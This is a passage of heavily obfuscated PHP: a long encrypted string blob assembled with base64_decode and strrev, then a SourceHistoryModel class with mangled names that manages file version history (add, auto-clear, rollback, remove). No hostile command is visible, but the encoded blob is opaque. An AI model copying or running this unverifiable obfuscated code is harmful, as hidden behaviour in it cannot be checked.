2\26\201\122\102\242\245\265\63\21\350\352\252\230\41\177"."\xc3\x8f\xcd\x69\x7c\x3\x80\xe\xfc\x74\x28\xd\x2d\x41\xbb\x35\x25\x89\xaf\x3d\x35\x55\xe1\xd4\x2a\xc5\x32\x93\xcc\x71\x78\x95\x1f\xc\xcc\x8\x80\x10\x9a\x96\xe8\x50\xa4\x1a\x17\x51\xd2\x88\x84\xbc\x24\x44"."\xb3\xab\x97\x2e\xf1\xeb\x50\xd2\xe7\x3f\x1a\xb3\x74\x3f\x36\xad\x2b\x1c\x8b\x7\x54\xb6\xf4\x21\xa9\x6d\xc2\x1b\x9a\xa2\x2c\x51\x15\x8a\xba\xa6\x6a\x72\x8c\x52\xad\x64\xd1\xb2\xcf\xed\x8a\x97\xba\xb\xf3\xa7"."\xde\x96\xf8\x55\x39\x13\x4f\xae\xa8\xc1\xb6\x94\x7c\x1b\x3f\xcc\x9d\x7f\x56\x3c\x41\xb\x48\xaf\x9\x90\x57\x99\x5a\xd4\xc2\xca\xf2\x22\xb8\x72\x5f\x52\xce\xea\xa1\x57\xde\xfa\xe4\xe1\x23\x97\xcd\xca\x4b\xfb".base64_decode('icLIL/QXCfokauXzR37sVoEwsI0MonFmnKAmBzGViSUCmgEZXVgbQTMc76fYkrFTCd+5JA==')."\207\70\246\170\145\156\303\6\132\21\176\127\147\343\306\362\64\60\237\166\147\5\212\272\73\11\123\220\73\15\153\205\104\32\132\353\234\237\241\324\53\3\211\24\6\103\177\105\231\160\347\162".strrev('Ïğ	0ñìr¤†à€ç¨z	Ï¯xÓC¬¬L¦d23:ı¬ßjŞ±"|3fGyû¡').base64_decode('EvdEuTGhgi0Mm5qW9nDxqo/lJYgyRR47Jp7q9QsZUaD9Y3wVD7Z0CgGczwvKaXxErRdwug==')."\46\137\46\36\342\223\171\23\15\7\212\105\7\113\141\21\174\242\225\323\373\375\234\17\320\123\56\137\122\134\304\144\40\204\13\271\322\261\155\240\53\3\337\75\43\311\303\210\145\32\46\347"."\133\74\35\325\305\23\201\314\61\157\221\130\11\317\136\142\45\115\275\150\73\370\32\175\127\272\212\74\347\66\240\16\253\24\244\112\1\225\135\123\25\171\215\243\12\361\61\232\303\230\31\157"."\340\22\374\65\44\23\347\232\252\110\47\254\254\246\241\362\204\127\125\372\10\52\130\245\60\156\232\127\71\36\115\333\100\213\46\277\362\7\117\144\166\107\341\56\122\240\23\316\26\217\136\113"."\177\217\71\232\121\22\171\277\63\207\204\145\162\323\202\360\55\42\221\247\261\52\226\2\301\123\235\135\321\110\74\322\302\136\302\163\352\154\151\332\134\266\273\260\350\225\126\261\41\143\367\350"."\xb8\x29\x11\x83\xe0\x62\x85\x1f\x52\x80\x1a\xcc\x52\xa1\xc0\x6d\x3b\x31\xbd\xf2\xb5\xae\xa9\xf2\x9f\x1e\x72\xfc\xa9\xa5\xfa\xa6\xc8\x57\x7a\x54\x76\x38\xa\xdc\x95\x9e\xf6\xc6\xb2\x25\x5b\x2c\xb7\xf8\xb9\x8f"."\70\276\236\157\101\262\344\54\25\273\152\325\122\276\36\352\116\240\251\216\335\226\142\226\244\342\232\47\203\224\163\24\274\64\364\161\254\243\371\357\7\366\51\146\126\65\76\317\203\47\252\252".strrev('Ü4ÇÇ	n ªâu|'."\r".'õî¬‰ã;Ø­¹<K<&PÇÇßM™×fÔ9åÕµY¾5Õ=').strrev('ü‘®®¤	\'™8Î`¡]Ÿú=]o:ºº†Ü[˜3šQK'."\r".'C‚µN-Î%@ô5Uº9õXÀI;"')."\x4f\x33\xc8\x6b\x6f\x40\x82\xce\x1c\xc4\x12\x19\x2f\x7\x80\x11\x4d\x83\x6\xc1\xda\x89\xb6\xc8\x25\x26\x88\xf6\xb4\xe0\xdb\xa4\xa\x6e\x1a\xc\x8b\xb0\x98\x45\xd4\x47\xbc\xd5\x32\xb6\xea\x78\x4c\x54\x21\x87"."\373\20\323\334\110\340\126\23\100\317\354\130\200\272\40\207\17\241\315\126\41\103\220\2\355\345\127\236\21\230\230\65\213\351\155\363\46\336\250\140\41\325\43\177\314\307\220\113\23\205\373\175"."\57\313\360\312\117\340\100\41\312\350\304\201\240\243\151\250\214\323\15\56\116\101\222\115\222\367\23\47\110\52\132\54\314\112\256\175\161\124\76\367\43\331\374\336\60\211\345\270\363\22\34\355"."\xe4\x35\xd1\x97\x96\xe8\xed\x5d\xc0\x61\x85\x59\x98\x35\x46\x12\x42\x36\xc1\xd1\xe3\x79\x8c\xa0\x14\x6f\x33\x19\x19\xa6\xa4\xbb\xdd\x18\xaf\x6c\x4d\x92\xc0\xb9\x75\x9a\x30\xed\x1\x4b\x25\xe2\xa7\x63\x50\x77".base64_decode('egxJSEVl3C7GgKwncWdJXBHiXwH+3hQ1TmZtU4Cj0Chxxk+fMCaKm8YDygbXdg8sGSPHiQ==').strrev('Û·‰ »§X„rhrô€•€L«–w©\\¸Zç@–A)cÚ°o±\\‡b‘¤Å$Û†').strrev('ÛÙ+ˆœœ2õ¼@'."\n".'Èrğs\'*»Ò†‘’İFƒ#Môã´°ÇVÓÏ˜u’NuKv[Ôî')."\350\100\316\302\125\202\232\342\213\243\4\52\266\320\122\242\163\66\113\31\55\374\131\70\71\21\357\140\145\143\54\262\253\160\326\201\267\306\316\24\336\262\257\41\72\246\342\260\115\265\140\245"."\145\353\22\6\46\70\22\126\77\311\157\137\46\34\144\302\150\225\331\176\141\14\11\53\13\147\72\115\243\112\10\307\11\160\234\60\272\234\26\207\346\320\124\72\251\160\5\141\366\264\163\314".strrev(''."\0".'®6ë"ª2¶$è„'."\n".'ø©üíÑıd&”aµŸ*B¿•£'."\n".'À±çéÚ÷™Ì\\“Sn¦È1á')."\132\203\146\263\24\303\265\263\143\116\264\113\266\250\266\323\203\223\25\372\344\270\202\37\122\237\341\34\237\362\2\360\70\233\201\244\107\354\120\133\56\204\353\352\166\261\250\25\16\216\310\333"."\112\105\67\146\267\252\314\364\65\200\115\355\114\366\62\13\345\307\302\204\302\17\335\356\101\335\352\103\133\235\161\276\232\300\200\364\120\156\314\352\304\115\206\120\212\215\217\342\134\135\245\265".strrev(':¦Š—x‹N6ùe†|´”õqo›`Î;}„ì\\…G®òbæi'."\n".'}9U‹<n«B+‘B')."\254\7\244\207\15\70\50\152\6\153\274\312\332\106\354\100\311\273\20\322\216\335\25\165\133\315\342\22\222\104\203\242\322\312\113\326\175\233\55\335\354\331\10\141\155\112\202\202\1\277\166\351"."\xe9\x2c\x70\x9a\xa0\xa3\x98\x64\xa4\x58\xa1\x7d\x50\x2b\xaf\x13\xb7\xa0\x20\x8c\x5d\x41\x80\x31\xb5\xa4\x61\xa6\xf0\x82\x28\xf9\xd8\x29\xd8\x51\x2d\x23\x47\x89\xa1\x2\x9b\xd\xc2\xf5\xbc\x5c\x5\x76\x5c\x26"."\xb1\x1d\x3c\xb\x3\x49\xbb\x24\xbb\x41\x93\x5e\xa7\x40\x31\xe9\x15\x12\x49\x10\xf5\xd6\x2b\x5c\x82\x4d\xd0\x9a\x69\x64\xb6\x94\x41\xe0\x2b\x9\xb3\x2e\x4d\xad\x74\x75\x8d\x68\xa6\x62\xa5\x7e\x7e\xee\xec\x12"."\61\331\155\70\105\226\340\330\365\66\134\1\361\113\205\173\140\311\171\250\132\354\25\136\364\114\56\102\276\131\126\204\346\141\41\112\334\203\223\163\54\374\274\110\67\33\305\112\71\25\76\105"."\262\44\214\46\31\245\301\54\137\43\220\4\31\143\32\63\323\366\326\67\170\231\47\114\371\156\34\333\234\321\30\336\70\112\144\200\267\267\214\215\201\221\63\300\11\30\103\72\275\47\236\240"."\204\317\33\342\334\212\217\47\361\202\305\143\246\44\113\150\334\0\232\270\211\222\331\272\60\116\242\166\321\30\240\273\122\76\305\20\316\156\165\130\262\273\0\320\374\160\346\303\103\43\242\61".base64_decode('1FOV4bAsdFUCr9nIT6mQUqIfwtwfJRn0ORMJMcLIijrQYvcZOJMTyXGDJ5YbamGqhCqpEw==')."\1\330\361\326\324\142\47\2\16\155\143\307\30\277\352\215\255\33\361\42\315\355\327\55\71\302\162\71\161\132\216\10\265\346\164\224\346\111\34\152\104\143\376\0\330\116\275\253\275\313\317\223"."\232\371\364\244\212\22\341\237\257\205\231\114\152\243\132\22\352\312\353\111\45\34\131\36\152\11\204\133\103\261\25\112\6\237\270\12\223\102\324\334\4\231\266\11\113\74\331\103\336\50\162\116"."\160\242\73\246\303\301\150\275\237\277\227\203\203\336\176\264\217\360\246\370\136\313\22\273\52\322\103\250\114\74\56\350\254\226\122\245\146\226\325\130\300\327\366\162\145\145\260\106\274\2\164\116"."\350\177\45\340\242\251\225\303\217\151\330\264\121\152\261\124\240\124\241\65\0\137\371\13\344\221\43\31\32\211\107\132\141\252\306\353\205\141\335\322\5\73\140\45\306\344\332\3\255\35\241\316".base64_decode('RCAcjqxyWASLswCTK1JS8oNT0siIQaBfL3cOCa745Mc8XMoVOnyyl9EiO8yCh3D5AzQ0Kg==')."\75\10\127\64\125\335\322\244\4\372\166\331\54\270\45\247\346\162\216\347\135\163\151\51\132\162\256\267\25\77\225\240\37\140\151\104\320\235\32\40\32\132\336\36\377\137\67\125\117\11\377\201".base64_decode('eoqZnPG70PRtmhb5KWD2TfECUnnK//ZBPY/knYz4X2Mvdxpk2wQyPU0LRRLUEZn4BJJizA==')."\xb1\xa2\x7c\x42\xeb\x4f\x41\xd\xd8\x53\x6a\x90\x9d\xfe\xe1\x88\xd8\xb7\x60\x28\xa8\x4\x7f\x85\xee\x66\xd1\x26\x1d\x2b\x14\xd9\xe\x87\x29\xe7\x10\x1b\x1\x84\x3b\xcc\x2c\x5d\x2f\x2\xba\xd\xe3\x1d\xef\xfd".strrev('|Á‡oˆ><ÂYHJ%8ú:”šP•­”'."\0".'Ğ©Îê(”Üş1B}ì‚ÉÈóC?<ƒ}•')."\xd1\x76\xec\xf4\xdb\xe5\x4b\x32\xd2\x90\xd0\x4\xac\xff\x31\xb9\x2\x8f\x8e\x39\x8b\xe2\x81\x6d\x62\x83\x99\x90\xd7\x4e\xc2\x87\xc5\xfe\xf\x5b\x60\x1a\xf9\xb1\xb2\x4\x87\x76\x2c\xcc\x7a\xc3\x6d\xa1\xf1\xf3".strrev('ß8Œk/Ÿ~²ı{–A¼¤¬ë{rLfi?ÿñhìGòìÑ´K=>ŠO|sğc!´…K')."\243\305\51\356\27\371\34\157\361\111\63\214\370\57\220\137\17\164\26\362\224\75\203\245\220\247\304\25\304\214\140\354\261\15\217\45\317\162\351\323\63\351\117\57\374\262\325\320\335\10\312\347"."\340\223\265\234\24\133\262\172\56\145\162\353\54\221\320\241\11\355\3\51\205\30\113\121\145\117\246\223\267\72\241\273\374\345\255\112\317\64\142\37\247\316\7\304\304\273\154\142\351\165\276\123"."\xc5\xcf\xfb\x2d\x31\x85\x2c\xdb\xf1\x32\x5a\xdc\x88\xab\x19\xf\x25\x55\xcc\x14\x45\xac\x79\x4c\xe\xcb\xf6\xf9\xa4\x17\x28\x13\x10\xa9\xa7\xf8\x78\x2f\x95\x0\xd8\x63\xa7\x29\xf\x79\x89\x93\xf2\x45\xf7\xd3"."\x5e\xd2\xfc\xe4\xec\x57\x2e\x9d\xc9\x19\xfd\x6a\xe\x4c\x7\x1d\xb7\xea\x4c\xb4\x45\xd3\xd8\x12\xe2\x0\xa3\x49\x7e\xb5\x58\x14\xe7\x21\xf2\x8a\x8b\xfe\x75\x5c\x98\x86\xbc\xee\x78\x7b\x82\x38\xf\x49\x50\xa3"."\x85\x98\xa0\x39\xe9\x8c\x92\x26\xc2\x79\x65\xa9\x10\xa2\xe7\x32\x8e\x54\x53\xda\x3c\xca\xe\xa3\xe9\x59\x8d\xb8\x77\xb\xe0\xa8\x9d\x5d\xf4\x70\x16\x10\x26\x57\xc9\xe\xcc\xb9\x9e\x1d\xf1\x23\xbe\xc7\xf6\x97".strrev('‘^•ª›ÁÎÏJ¤×Ú9§	N·Ób$%&2&8iQ, '."\0".'ww“æd'."\r".'W™‡ÊØ(à3«c°')."\243\224\117\176\132\265\64\337\51\341\270\220\15\144\7\110\302\366\306\375\334\151\371\323\255\354\231\126\66\165\340\215\326\12\17\257\116\371\156\253\107\134\261\376\272\307\351\304\205\336\42\32".strrev('ÃÃÄ<æd»õ Ğ•¦_ÊÚÀ×©YUã‚	…+”n9#u*êÑÃ+{Œı²‘›à²\\¼#ç'."\n".'')."\40\53\76\156\353\170\52\317\75\240\25\236\307\375\306\12\341\2\4\331\311\245\234\134\257\161\111\277\311\216\255\335\140\272\203\166\321\2\54\156\371\121\367\320\145\13\304\232\174\252\141\316"."\274\105\262\306\104\14\241\70\314\235\103\177\340\114\32\144\34\101\24\212\3\15\36\205\371\244\226\147\77\311\164\336\250\51\177\111\331\265\2\374\357\46\214\330\174\120\120\311\110\267\374\315"."\xf9\x32\xc\x10\x3a\x95\x4c\xc3\xa4\x5\xd1\x65\xf7\x63\x60\x53\x1c\x4b\xcc\x3a\xba\x4\x8a\xf7\x93\x9d\xdf\xa2\xe2\x43\x85\x7e\x88\xcf\x4a\x93\x85\xbe\x85\x6b\xe4\xf0\xc6\x3d\x8f\xf\x4\x6c\x53\x75\xee\x47".strrev('±m/ı‰6ÌBìm–B‘¥tHºñÅÂ_­ÃmäËí-‘*iÌEtëØ&»m+')."\xe8\x6e\x4c\x98\x84\xe1\xee\x3b\x76\xe6\x4e\x2c\xf8\x8f\x63\x6c\xa6\xc2\xbb\xc7\x92\xc1\xcc\xd7\xf4\x81\x4a\x7a\x7c\x6b\xe9\x55\x6d\xaf\x44\x9c\x92\x7e\x52\xb3\x23\x64\xb0\x81\x5d\x88\x1d\xb0\xb3\xdf\xae\xea"."\x51\x31\x51\x47\x9f\x47\x99\xa\xa8\x5c\xdc\x93\x9e\x47\x16\x3e\xf\x25\x41\xf\x97\x66\xb7\xc7\xa7\x50\x20\x90\xcb\xcb\x4e\x91\x49\x7e\xbd\x95\xdc\xfc\x15\xce\x79\xc8\xd4\x75\x4c\x63\xc9\x5\xbc\x7c\x73\x96"."\124\44\317\217\362\252\245\267\160\205\332\211\350\251\240\107\60\271\211\5\5\151\146\140\71\277\167\255\112\366\175\116\135\30\10\167\322\103\356\10\175\322\133\347\206\34\226\336\130\106\153\102"."\204\335\235\100\315\161\154\143\121\134\370\104\227\370\127\312\225\310\160\106\230\206\340\207\322\175\176\307\126\211\77\17\352\330\72\131\356\67\202\221\50\350\170\244\44\125\366\254\72\60\116\162".strrev('ÜUëû?üÛ0Óš}N=rÁLæñsö{'."\0".'öáÓ<[öL£I”³¨R2£YzZM~{')."\171\374\255\37\134\77\277\343\267\34\204\163\150\55\76\140\345\272\16\252\167\166\365\303\271\274\116\3\52\102\310\367\15\13\246\102\342\334\202\234\171\167\144\116\37\125\166\376\246\346\162\322"."\42\134\171\73\123\366\146\71\42\276\101\376\316\165\245\210\373\156\260\373\375\362\36\242\366\145\117\223\367\125\2\24\174\211\357\232\52\320\61\115\142\302\262\340\111\5\75\71\130\341\360\234"."\130\311\72\337\40\220\204\223\62\60\321\6\44\303\60\267\231\176\26\112\342\355\42\161\21\3\330\223\257\361\107\212\154\143\131\13\253\100\37\374\202\353\20\140\132\62\243\162\44\225\261\267".base64_decode('uGNMHIkyugUP8rHhdJTocD3HTIEsGbeO84JyW4ry0pwPyEWwob5TNYYHGDfMW+d1JdR7XQ==')."\xd5\xf1\x17\xa9\x9d\xb4\xee\x78\x22\x99\xda\x9f\xa0\x9\x12\xc5\x2a\x10\xa6\xa\x23\x47\x4e\xe4\xec\xd9\x5b\x5e\x86\xd2\x75\x4c\xc0\x4c\x31\xb3\x2a\xcf\x6f\xde\x28\xa1\xe\xc4\x21\x19\x1f\x8c\x4f\x74\x99\x6"."\21\24\235\251\134\55\44\331\113\47\45\235\253\133\366\243\311\63\175\162\107\344\103\131\347\311\16\66\330\23\107\235\361\110\64\230\130\25\302\56\47\102\47\6\273\231\263\144\335\40\157\234"."\260\52\273\73\152\310\255\65\230\0\150\27\323\146\10\122\322\20\63\223\24\300\302\343\257\235\57\266\360\203\131\347\335\147\351\106\4\363\267\45\253\44\235\300\370\232\213\163\56\56\255\4"."\226\64\114\113\166\227\351\310\304\142\227\201\162\243\154\37\335\135\100\23\131\113\332\132\112\301\13\270\103\246\357\231\133\67\247\357\353\152\231\313\236\241\103\220\163\277\1\22\66\27\261\71"."\136\146\333\313\140\52\226\63\250\177\234\112\171\210\66\143\266\203\210\304\3\71\356\207\161\332\34\276\247\32\45\25\251\102\274\160\301\13\111\123\214\115\247\321\42\104\13\127\36\146\15\123"."\347\342\335\51\77\175\146\357\251\140\273\71\77\166\322\205\57\147\370\11\375\201\146\173\115\42\237\140\146\104\130\47\40\64\73\204\343\226\357\11\341\113\266\71\26\61\243\171\176\47\203\150"."\163\250\202\306\241\247\1\153\1\71\111\72\75\107\233\255\224\363\111\61\222\111\222\231\127\156\250\101\72\377\165\36\277\363\373\254\145\353\137\111\17\113\331\244\24\363\356\212\176\361\325\374"."\x90\x70\x91\x44\xb2\xe9\x19\x56\x60\x58\xe5\x5e\xc8\xdc\xa5\xba\x1d\x1b\x59\xe9\xb0\x3e\x49\x38\x44\xb0\xfc\x3c\x56\x1c\x13\x4b\xd2\x23\x2b\x86\x77\xc2\x62\x61\x77\xa5\x4b\x1c\x55\xac\x79\xea\xb0\x90\x85\xc5".base64_decode('XiyValOHK4CmNLcXOZTCQYksLfnUEBdltBH56wAn7rE4AMtThc8Nqbw4gxPdxGmVuk84nA==')."\xb3\xb8\xec\xd3\x83\x13\x95\x48\xa2\x4f\x46\x71\xcb\x16\x69\xdf\x8b\x4d\x7f\x84\xc9\xb\xed\xa\x57\xef\x88\x4f\x3a\x3d\x88\x70\x30\x3e\x66\x8\x86\xdc\xb0\xf3\x3a\x52\x5d\x3b\x79\xac\x49\x63\x72\xa0\x2b\xb"."\164\113\122\365\25\125\120\22\11\150\271\260\124\235\174\76\77\145\201\130\345\217\10\252\164\242\130\162\275\42\62\230\310\42\327\342\130\263\170\307\0\62\52\147\72\232\343\36\132\262\361\24"."\344\113\23\363\104\215\117\363\2\316\54\12\257\271\132\57\27\160\367\214\226\160\274\46\50\247\217\350\166\62\53\355\222\313\63\313\323\315\62\144\103\3\52\367\303\335\132\206\153\267\356\100"."\124\122\326\36\311\370\47\156\124\50\103\133\124\261\30\315\302\45\305\346\304\121\166\12\24\340\262\64\13\227\55\313\146\205\313\360\112\312\331\152\311\232\242\173\345\310\3\135\124\252\102\207".base64_decode('hcZGAp0KnxWByz8HlOiGJsqryq0QOieXuUWlVlQEnrIVbmghc+AdaKUch82Sc0WpxLdZTg==').base64_decode('BU5NudCUxkzCwKd8yRB5FcyN6Cex9CO7a6yQLdsuVbZuilbkMpbT7MiVLiMIHIrTCDNPRA==').base64_decode('IlhOHxRmnexWB2gduI3kYMHgy1NKWO1iySlguvFcVpuT9AslybV7xUsmHqwYKlfB5FR+2w==')."\117\130\276\321\75\263\141\353\111\315\351\77\136\366\332\110\363\331\107\162\222\32\332\245\1\26\152\52\207\1\114\5\275\50\111\242\101\237\70\214\241\365\211\276\110\64\341\270\3\106\105\22".base64_decode('OMOix98t2CaDH3wSJ+Z0CafZMcO0PTgvbhTJb7Nh28KahOqFiJiN12GPZCyFQuKUEzeKHA==').base64_decode('nxGyJRyLBOEgHitcYhrNJXzOEcHHcjwiL7NwIN9WcpkMiIRBI9VvjDJXiYiuJCSJgzvVLQ==').base64_decode('WwqxCEhRNv0irkYsP83xw2NFXlIHvJLqGyhmHMXpu5PccPvragDlvaiCvlRCNKlwRy0Wjw==')."\x95\x65\x75\x5\x62\xb1\x55\x91\x68\x2b\x7d\xd8\xa4\x2c\x9b\x94\x92\xc\xec\xca\xb2\xba\xda\x23\x9d\x53\xe5\x5\x3b\x2\xa1\x70\x59\x1e\xb6\xc5\xeb\x4c\x8\xa7\x9b\x34\x2b\xd4\x45\x5a\x49\xce\x9e\xa7\x6a\x45"."\xa8\x65\x85\x68\x49\xb9\xaf\x53\x76\x56\x16\x86\x87\x34\xc5\xb8\x48\x67\x47\xc5\xac\xc1\x8e\x84\x18\x7c\x4c\x65\x6f\x78\xcb\x67\xb\x5a\x5e\x78\x65\x15\x65\x9c\x3a\x2e\x79\xfc\x2d\xe6\x3e\x99\x7\x9c\xaf\x9".base64_decode('ukxjGWFDRdiyrhPqjhYhFT8Iw/kDl/OFeYfPYQYipZM5RJiSRJvyek8SZlVEkHzWUH4ORg==').strrev(''."\0".''."\0".'¹[=¿-ùÿ»”!.c!U5¢¦jÛdvIë%J˜î.è¹Î—èÀsXÀ7Ãpr').""."", 10, -8))); goto bÇ¹µ´’Œ¾; eƒ”¾ ªÙÛ: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\162\143\145\x5f\x68\x69\163\x74\x6f\162\x79"; public function historyCount($ëîûÙ¨‚) { $Ï·¸ü‹ =& $_SERVER[¿ğÚ‰±–]; if (!$ëîûÙ¨‚) { return array(); } if (is_string($ëîûÙ¨‚) || is_int($ëîûÙ¨‚)) { $ëîûÙ¨‚ = array($ëîûÙ¨‚); } $›ï™È— = array($Ï·¸ü‹[193], $Ï·¸ü‹[2009] => $Ï·¸ü‹[565]); $ò–©¹¤Ì = array($Ï·¸ü‹[193] => array($Ï·¸ü‹[7], $ëîûÙ¨‚)); $úñä˜ĞÒ = $this->field($›ï™È—)->where($ò–©¹¤Ì)->group($Ï·¸ü‹[193])->select(); return array_to_keyvalue($úñä˜ĞÒ, $Ï·¸ü‹[193], $Ï·¸ü‹[565]); } public function addHistory($šºøµºå, $òº×†·‚ = '') { $ĞÑ”£È¥ =& $_SERVER[¿ğÚ‰±–]; $µŒ‘¬ùä = array($ĞÑ”£È¥[491] => $šºøµºå[$ĞÑ”£È¥[193]], $ĞÑ”£È¥[1768] => isset($šºøµºå[$ĞÑ”£È¥[529]]) ? $šºøµºå[$ĞÑ”£È¥[529]] : $šºøµºå[$ĞÑ”£È¥[527]], $ĞÑ”£È¥[542] => $šºøµºå[$ĞÑ”£È¥[541]], $ĞÑ”£È¥[617] => $šºøµºå[$ĞÑ”£È¥[79]], $ĞÑ”£È¥[2226] => $òº×†·‚); if ($GLOBALS[$ĞÑ”£È¥[6]][$ĞÑ”£È¥[92]][$ĞÑ”£È¥[1309]] >= 1) { $this->historyAutoClear($µŒ‘¬ùä[$ĞÑ”£È¥[193]]); $this->add($µŒ‘¬ùä); } Hook::trigger($ĞÑ”£È¥[2227], $µŒ‘¬ùä); Model($ĞÑ”£È¥[2228])->eventFileEdit($šºøµºå[$ĞÑ”£È¥[193]]); } private function historyAutoClear($ì²¿¶òØ) { $”Ôù­Œ¶ =& $_SERVER[¿ğÚ‰±–]; $§ôŸ¹ß = Model($”Ôù­Œ¶[848])->get($”Ôù­Œ¶[1331]); $‰Æßºˆâ = intval($GLOBALS[$”Ôù­Œ¶[6]][$”Ôù­Œ¶[92]][$”Ôù­Œ¶[1309]]); $Üƒ¢¸–É = $§ôŸ¹ß == $”Ôù­Œ¶[1332] ? min(5, $‰Æßºˆâ) : $‰Æßºˆâ; $Üƒ¢¸–É = $Üƒ¢¸–É <= 0 ? 0 : $Üƒ¢¸–É - 1; if ($Üƒ¢¸–É >= 499) { return; } $ÒíóãÎ´ = array($”Ôù­Œ¶[491] => $ì²¿¶òØ); $ øíôÊÕ = $this->field($”Ôù­Œ¶[2229])->where($ÒíóãÎ´)->order($”Ôù­Œ¶[2223])->select(); if (!$ øíôÊÕ || $Üƒ¢¸–É >= count($ øíôÊÕ)) { return; } $çóµûÌÖ = array_to_keyvalue($ øíôÊÕ, $”Ôù­Œ¶[12], $”Ôù­Œ¶[475]); $çóµûÌÖ = array_slice($çóµûÌÖ, $Üƒ¢¸–É); $µÀùòÆ = array_to_keyvalue($ øíôÊÕ, $”Ôù­Œ¶[12], $”Ôù­Œ¶[541]); $µÀùòÆ = array_slice($µÀùòÆ, $Üƒ¢¸–É); if (!$çóµûÌÖ || !$µÀùòÆ) { return; } $ÒíóãÎ´ = array($”Ôù­Œ¶[493] => array($”Ôù­Œ¶[7], $çóµûÌÖ)); $this->where($ÒíóãÎ´)->delete(); Model($”Ôù­Œ¶[544])->remove($µÀùòÆ); } public function listData($ìôÖØÌ) { $îîæâÑ =& $_SERVER[¿ğÚ‰±–]; $¦‹¼ƒìÄ = array($îîæâÑ[491] => $ìôÖØÌ); $¥­½•ÑÀ = $îîæâÑ[2230]; $¶©çÕ…ç = $this->field($¥­½•ÑÀ)->where($¦‹¼ƒìÄ)->order($îîæâÑ[2223])->selectPage(); $this->_listAppendUser($¶©çÕ…ç[$îîæâÑ[445]]); $®—–±ŠÇ = Model($îîæâÑ[848])->get($îîæâÑ[1331]); $ûÄµæÉª = 5; if ($®—–±ŠÇ == $îîæâÑ[1332]) { $¶©çÕ…ç[$îîæâÑ[445]] = array_slice($¶©çÕ…ç[$îîæâÑ[445]], 0, $ûÄµæÉª); $¶©çÕ…ç[$îîæâÑ[442]] = array($îîæâÑ[2231] => 1, $îîæâÑ[2232] => 20, $îîæâÑ[2233] => 1, $îîæâÑ[2234] => count($¶©çÕ…ç[$îîæâÑ[445]])); } return $¶©çÕ…ç; } protected function _listAppendUser(&$Ú‡¹÷—±) { $Öª½é™ı =& $_SERVER[¿ğÚ‰±–]; $÷ê½İ· = array_to_keyvalue($Ú‡¹÷—±, $Öª½é™ı[12], $Öª½é™ı[1777]); $ƒÎô´® = Model($Öª½é™ı[598])->userListInfo($÷ê½İ·); foreach ($Ú‡¹÷—± as &$’ÓıÍ¤Ò) { $İ§æÍÔø = $’ÓıÍ¤Ò[$Öª½é™ı[1777]]; $’ÓıÍ¤Ò[$Öª½é™ı[527]] = $ƒÎô´®[$İ§æÍÔø] ? $ƒÎô´®[$İ§æÍÔø] : !1; } unset($’ÓıÍ¤Ò); } public function fileInfo($øÑÒ¢Àî) { $¸ö¬Ö€º =& $_SERVER[¿ğÚ‰±–]; $æ¿¹„©¢ = $this->tablePrefix; $æ¯ó“Ã = "{$æ¿¹„©¢}\x69\x6f\137\146\151\154\x65\x20\x66\x69\154\x65\x73\x20\x6f\156\40\146\x69\154\145\163\x2e\x66\x69\x6c\145\x49\104\x20\75\x20\x68\x69\163\x74\157\x72\171\x2e\x66\151\x6c\x65\x49\104"; return $this->alias($¸ö¬Ö€º[2235])->where(array($¸ö¬Ö€º[493] => $øÑÒ¢Àî))->join($æ¯ó“Ã, $¸ö¬Ö€º[2236])->find(); } public function removeItem($ˆà›Îè¬) { $ß¹–¤± =& $_SERVER[¿ğÚ‰±–]; $˜¡°Àìé = array($ß¹–¤±[493] => $ˆà›Îè¬); $ğ·ÔñÁ± = $this->where($˜¡°Àìé)->find(); if ($ğ·ÔñÁ±) { $¿¨ş³ = $this->where($˜¡°Àìé)->delete(); Model($ß¹–¤±[544])->remove($ğ·ÔñÁ±[$ß¹–¤±[541]]); return $¿¨ş³; } return !1; } public function removeBySource($ı¨„´Ü) { $Å–µØø´ =& $_SERVER[¿ğÚ‰±–]; if (!$ı¨„´Ü) { return !1; } if (!is_array($ı¨„´Ü)) { $ı¨„´Ü = array($ı¨„´Ü); } $ˆÍÒœ– = array($Å–µØø´[491] => array($Å–µØø´[7], $ı¨„´Ü)); $«şÂÅĞŒ = $this->field($Å–µØø´[542])->where($ˆÍÒœ–)->select(); if ($«şÂÅĞŒ) { $this->where($ˆÍÒœ–)->delete(); $ÖÃ›¹Ï = array_to_keyvalue($«şÂÅĞŒ, $Å–µØø´[12], $Å–µØø´[541]); Model($Å–µØø´[544])->remove($ÖÃ›¹Ï); } return !0; } public function setDetail($àÊ›™Æ, $”¬ëºäÀ) { $õë“†Áš =& $_SERVER[¿ğÚ‰±–]; return $this->where(array($õë“†Áš[493] => $àÊ›™Æ))->save(array($õë“†Áš[2226] => $”¬ëºäÀ)); } public function rollbackToItem($á‡ÒæÉ·, $ÌÕ—±„œ) { $ö€Òò³ı =& $_SERVER[¿ğÚ‰±–]; $¡úú¨å¡ = Model($ö€Òò³ı[902])->sourceInfo($á‡ÒæÉ·); $this->addHistory($¡úú¨å¡, LNG($ö€Òò³ı[2237])); $ğ×ëİÚ· = $this->find($ÌÕ—±„œ); $Ï¡Í½­† = array($ö€Òò³ı[541] => $ğ×ëİÚ·[$ö€Òò³ı[541]], $ö€Òò³ı[79] => $ğ×ëİÚ·[$ö€Òò³ı[79]], $ö€Òò³ı[88] => time(), $ö€Òò³ı[529] => USER_ID); Model($ö€Òò³ı[902])->where(array($ö€Òò³ı[193] => $á‡ÒæÉ·))->save($Ï¡Í½­†); return $this->where(array($ö€Òò³ı[493] => $ÌÕ—±„œ))->delete(); } public function clearSame($ÃêôäÃ¸) { $Ã±ô¹èò =& $_SERVER[¿ğÚ‰±–]; $á‚ûùÚ½ = $this->listData($ÃêôäÃ¸); $¦Ö™•â = array_to_keyvalue_group($á‚ûùÚ½, $Ã±ô¹èò[541]); $³Ü÷¬¼° = array(); $îÏÌÄ = array(); foreach ($¦Ö™•â as $‹›Óª“) { if (!$‹›Óª“ || count($‹›Óª“) <= 1) { continue; } foreach ($‹›Óª“ as $Ú ¹¼¥ì) { $³Ü÷¬¼°[] = $Ú ¹¼¥ì[$Ã±ô¹èò[541]]; $îÏÌÄ[] = $Ú ¹¼¥ì[$Ã±ô¹èò[475]]; } } if (!$îÏÌÄ) { return; } $this->where(array($Ã±ô¹èò[475] => array($Ã±ô¹èò[7], $îÏÌÄ)))->delete(); Model($Ã±ô¹èò[544])->remove($³Ü÷¬¼°); } public function userSpace() { $÷¦¼˜º =& $_SERVER[¿ğÚ‰±–]; $Í¦³°×Ò = $this->tablePrefix; $ÌˆĞ¦•ã = array($÷¦¼˜º[1768] => USER_ID); $Ä˜Ù·ì 